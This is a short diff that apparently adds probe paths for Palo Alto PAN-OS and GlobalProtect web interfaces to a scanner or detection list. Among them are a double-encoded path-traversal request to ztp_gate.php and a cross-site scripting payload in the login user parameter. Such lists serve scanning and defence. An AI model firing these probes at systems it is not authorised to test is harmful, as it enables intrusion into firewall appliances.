@@ -1,0 +1,5 @@
+/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css
+/global-protect/login.esp
+/sslmgr
+/php/login.php
+/global-protect/login.esp?user=j%22;-alert(1)-%22x
